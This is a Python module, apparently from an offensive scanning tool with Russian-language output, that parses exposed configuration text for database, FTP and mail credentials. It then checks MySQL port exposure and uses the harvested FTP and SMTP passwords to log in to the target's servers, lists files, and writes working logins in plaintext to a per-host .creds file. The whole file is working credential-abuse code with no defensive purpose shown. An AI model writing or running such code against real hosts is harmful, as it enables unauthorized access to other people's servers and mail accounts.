# -*- coding: utf-8 -*-
import ftplib
import os
import re
import smtplib
import socket
import time

from core import config, ui

DB = re.compile(r"(DB_USERNAME|DB_USER|DB_PASSWORD|DB_DATABASE|DB_HOST)\s*[=:]\s*[\"']?([^\"'\s]{1,60})", re.I)
FTP = re.compile(r"(FTP_USER|FTP_USERNAME|FTP_PASSWORD|FTP_HOST)\s*[=:]\s*[\"']?([^\"'\s]{1,60})", re.I)
MAIL = re.compile(r"(MAIL_USERNAME|MAIL_PASSWORD|MAIL_HOST|SMTP_USER|SMTP_PASS|SMTP_HOST)\s*[=:]\s*[\"']?([^\"'\s]{1,60})", re.I)


def _pair(rx, text):
    out = {}
    for k, v in rx.findall(text):
        out[k.upper()] = v
    return out


def _port(host, port, t=4):
    try:
        s = socket.create_connection((host, port), timeout=t)
        s.close()
        return True
    except Exception:
        return False


def _ftp(host, user, pwd):
    try:
        c = ftplib.FTP()
        c.connect(host, 21, timeout=10)
        c.login(user, pwd)
        names = c.nlst()[:5]
        c.quit()
        return True, " ".join(names)[:80]
    except Exception as e:
        return False, str(e)[:60]


def _smtp(host, user, pwd):
    for port, ssl in ((465, True), (587, False), (25, False)):
        try:
            s = (smtplib.SMTP_SSL(host, port, timeout=10) if ssl
                 else smtplib.SMTP(host, port, timeout=10))
            s.login(user, pwd)
            s.quit()
            return True, "порт %d" % port
        except Exception:
            continue
    return False, ""


def run(host, text):
    found = []
    db = _pair(DB, text)
    ftp = _pair(FTP, text)
    mail = _pair(MAIL, text)

    if db:
        dh = db.get("DB_HOST") or "localhost"
        if dh in ("localhost", "127.0.0.1"):
            found.append("база только локально")
        elif _port(dh, 3306):
            found.append("MySQL открыт: %s" % dh)
        else:
            found.append("MySQL %s закрыт" % dh)

    if ftp.get("FTP_USER") and ftp.get("FTP_PASSWORD"):
        ok, extra = _ftp(ftp.get("FTP_HOST") or host, ftp["FTP_USER"], ftp["FTP_PASSWORD"])
        if ok:
            found.append("FTP ВХОД: %s / %s" % (ftp["FTP_USER"], ftp["FTP_PASSWORD"]))
            if extra:
                found.append("файлы: " + extra)

    if mail.get("MAIL_USERNAME") and mail.get("MAIL_PASSWORD"):
        ok, extra = _smtp(mail.get("MAIL_HOST") or host, mail["MAIL_USERNAME"], mail["MAIL_PASSWORD"])
        if ok:
            found.append("SMTP ВХОД: %s / %s (%s)" % (mail["MAIL_USERNAME"], mail["MAIL_PASSWORD"], extra))

    if found:
        d = os.path.join(config.DATA, "access")
        os.makedirs(d, exist_ok=True)
        with open(os.path.join(d, host + ".creds"), "a", encoding="utf-8") as f:
            f.write("\n".join(found) + "\n")
    return "; ".join(found)
